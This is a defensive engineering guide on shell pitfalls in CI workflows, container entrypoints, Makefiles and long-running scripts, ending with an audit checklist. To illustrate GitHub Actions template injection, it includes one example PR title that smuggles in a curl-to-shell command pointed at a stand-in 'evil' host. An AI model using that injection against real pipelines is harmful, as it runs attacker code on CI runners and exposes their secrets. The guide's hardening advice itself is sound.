# 04 — CI & Operational Scripts

Shell embedded in CI YAML, container entrypoints, Makefiles, and long-running jobs.
Smaller file; pipeline-wide hardening lives in `sota-devsecops`.

## 1. GitHub Actions (and CI generally) shell pitfalls

**Default shell is not your preamble.** On Linux runners GitHub Actions runs `run:` steps
with `bash -e` (no `pipefail`, no `-u`). Set it explicitly per workflow/job:

```yaml
defaults:
  run:
    shell: bash   # 'bash' keyword = bash --noprofile --norc -eo pipefail {0}
```

The bare `shell: bash` keyword adds `-o pipefail`; still no `-u` — put `set -u` (or the
full `set -euo pipefail`) at the top of nontrivial steps.

**`${{ }}` is template injection, not a variable.** Expressions are substituted into the
script *before* the shell parses it — a PR title of `"; curl evil | sh; "` executes:

```yaml
# CRITICAL
- run: echo "PR title: ${{ github.event.pull_request.title }}"

# GOOD — pass via env; shell sees a normal quoted variable
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: printf 'PR title: %s\n' "$TITLE"
```

Treat ALL `github.event.*`, branch names, commit messages, issue/PR text as attacker-
controlled. Lint with `actionlint` (embeds ShellCheck for run blocks) and audit with
`zizmor` (template injection, credential persistence, excessive permissions). Full
taxonomy → `sota-devsecops`.

**Multiline `run:` blocks**: each step is one script — a failing middle line only stops
the step because of `-e`; verify the effective shell options for your CI (GitLab uses
`sh`/`bash` without pipefail unless you set it; Jenkins `sh` step is `/bin/sh -xe`).
YAML quoting compounds shell quoting: prefer `run: |` literal blocks; avoid `run: "..."`
double-quoted YAML where `\` and `"` get re-escaped.

**Step outputs/files**: quote and delimit anything written to `$GITHUB_OUTPUT`/`$GITHUB_ENV`
— multiline or attacker-influenced values need a random heredoc delimiter, or they inject
extra variables:

```bash
{ printf 'body<<%s\n' "$delim"; printf '%s\n' "$body"; printf '%s\n' "$delim"; } >> "$GITHUB_OUTPUT"
```

**Beyond ~30 lines, move the step body to a committed script** (`ci/build.sh`): testable
locally, lintable by ShellCheck directly, diffable, and immune to YAML quoting.

## 2. Container entrypoint scripts

**`exec` the final process — non-negotiable.** Without `exec`, the shell stays as PID 1,
your app is a child, and `docker stop`/Kubernetes sends SIGTERM to the *shell*, which does
not forward it; the app gets SIGKILL after the grace period (data loss, dropped requests).

```bash
#!/usr/bin/env bash
set -euo pipefail
# setup: render config, wait-for-deps, migrations...
exec "$@"            # replaces shell; app becomes PID 1, receives signals directly
```

- `CMD`/args pass through as `"$@"` — keeps `docker run image alternate-command` working.
- PID 1 extras: no default reaping of orphaned zombies and some default-signal quirks —
  if the app forks workers and doesn't reap, add a minimal init (`docker run --init`,
  tini, or Kubernetes' shared PID namespace) rather than shell loops.
- If the entrypoint must stay resident (rare — e.g., multi-process wrapper), it must
  `trap 'kill -TERM "$child"' TERM INT`, start the child with `&`, and `wait "$child"`
  in a loop (re-`wait` after the trap fires to collect the real status).

**Privilege drop**: run the image as root only long enough to fix volume permissions,
then drop — `exec gosu app:app "$@"` or `exec su-exec app:app "$@"` (alpine). Never
`sudo` (TTY/signal/env baggage) and never `su - app -c "..."` (re-parses the command
string — injection; and signals stop at `su`). Prefer `USER app` in the Dockerfile when
no root setup is needed at all.

**Dialect**: alpine/distroless-adjacent base images have no bash — entrypoints there are
`#!/bin/sh` + busybox-clean (rules/02 §5), or you install bash explicitly. CRLF line
endings in an entrypoint produce `/usr/bin/env: 'bash\r': No such file` — enforce LF via
`.gitattributes` (`*.sh text eol=lf`).

## 3. Makefile shell gotchas

- **Each recipe line is a separate shell.** `cd dir` on one line does not affect the next.
  Either chain with `&&` + backslash continuations, or use `.ONESHELL:` (GNU make ≥3.82)
  to run the whole recipe in one shell.
- **Make's default shell is `/bin/sh`** and default flags are `-c` only — no `-e`!
  A failing command in the middle of a `cmd1; cmd2` line does not stop the recipe. Set:

```make
SHELL := bash
.SHELLFLAGS := -euo pipefail -c
.ONESHELL:
.DELETE_ON_ERROR:      # remove half-built targets when a recipe fails
MAKEFLAGS += --no-builtin-rules
```

  With `.ONESHELL`, `.SHELLFLAGS` must include `-c` last; without `-e` semantics only the
  last line's status fails the recipe.
- **`$$` escaping**: make expands `$` itself — shell variables in recipes are `$$var`,
  `$$(cmd)`, awk fields `$$1`. A single `$var` silently expands a (usually empty) make
  variable — classic silent-corruption bug:

```make
# BAD — $f is the make variable 'f' (empty); loop body runs once with empty name
clean-logs:
	for f in *.log; do rm -f $f; done
# GOOD
clean-logs:
	for f in ./*.log; do rm -f -- "$$f"; done
```

- `@` hides commands and their context when they fail — avoid on nontrivial lines, or
  pair with explicit error messages.
- Recipes longer than ~5 lines: move to `scripts/*.sh` and call it — ShellCheck can't see
  inside Makefiles, and `$$`-doubling makes review error-prone.

## 4. Long-running script logging

Deploy/migration/batch scripts that run for minutes need logs usable during *and* after.

- **Timestamps on every line.** Pipe through a stamper rather than littering `date` calls:

```bash
log() { printf '%(%Y-%m-%dT%H:%M:%S%z)T %s\n' -1 "$*"; }          # bash ≥4.2, no fork
main 2>&1 | while IFS= read -r line; do log "$line"; done          # stamp child output
# or: ts '%FT%T%z' (moreutils), or systemd-cat / logger for the journal/syslog
```

- **Line buffering**: a script piping into `tee`/a file sees child stdout switch to 4–64 KB
  block buffering — logs appear in bursts and the tail is lost on crash. Force line mode
  for chatty children: `stdbuf -oL -eL cmd | tee "$log"` (GNU coreutils).
- Standard capture pattern — console and file, stderr distinguishable:

```bash
exec > >(stdbuf -oL tee -a "$logfile") 2>&1
```

  Note: process substitution may still be flushing when the script exits; for strict
  ordering on exit, `wait` is not available for procsubs portably — accept it or log to
  file directly and `tail -f` separately.
- Progress/heartbeat for anything > ~60s silent (CI runners kill "stalled" jobs;
  e.g. `printf 'still waiting for %s (%ds)\n' "$svc" "$elapsed"` every 15–30s in wait loops).
- Log decisions and inputs (versions, target, flags) at start; final status + duration at
  end; everything through the stderr/stdout discipline of rules/02 §3 so CI annotates
  errors correctly.
- Cron jobs: cron's environment is minimal (PATH=/usr/bin:/bin, no profile) — set PATH
  in-script (rules/03 §3); redirect both streams to a log or you get silent failures /
  mail spam: `*/5 * * * * /opt/job.sh >>/var/log/job.log 2>&1`.

## Audit checklist

- [ ] Workflows: `grep -rn '\${{' .github/workflows/ | grep -i 'head_ref\|pull_request\.\(title\|body\)\|commits\|issue\.\(title\|body\)\|comment\.body'`
      inside `run:` → CRITICAL (injection); fix via `env:` indirection.
- [ ] `grep -rLn 'shell: bash\|pipefail' .github/workflows/*.yml` — steps relying on
      default shell semantics → MEDIUM.
- [ ] `>> "$GITHUB_OUTPUT"` / `$GITHUB_ENV` writes of non-constant values without heredoc
      delimiters → HIGH.
- [ ] Run `actionlint` (embeds ShellCheck) and `zizmor` on workflows; `hadolint` on
      Dockerfiles (DL4006 pipefail-in-RUN, SC-rules inside RUN).
- [ ] Entrypoints: `grep -rn '"\$@"\|exec ' docker/ *entrypoint*` — final command lacking
      `exec` → HIGH (signal loss); `su -c`/`sudo` for privilege drop instead of
      gosu/su-exec/USER → HIGH.
- [ ] `#!/usr/bin/env bash` entrypoint with alpine/busybox base image in Dockerfile → HIGH.
- [ ] `git ls-files --eol -- '*.sh'` showing `w/crlf` → HIGH for any image-bound script;
      missing `*.sh text eol=lf` in `.gitattributes` → LOW.
- [ ] Makefiles: missing `.SHELLFLAGS`/`SHELL := bash` where recipes use bashisms;
      `grep -n '\$[a-zA-Z{(]' Makefile` inside recipes for single-`$` shell vars
      (silent empty expansion) → HIGH; multi-line recipes without `&&` or `.ONESHELL`.
- [ ] Missing `.DELETE_ON_ERROR` in Makefiles producing artifacts → MEDIUM.
- [ ] Long-running scripts: no timestamps, no heartbeat in wait loops, `tee` without
      `stdbuf -oL` for crash-time tails → LOW/MEDIUM.
- [ ] Crontabs/`cron.d`: entries without output redirection or with implicit PATH → MEDIUM.
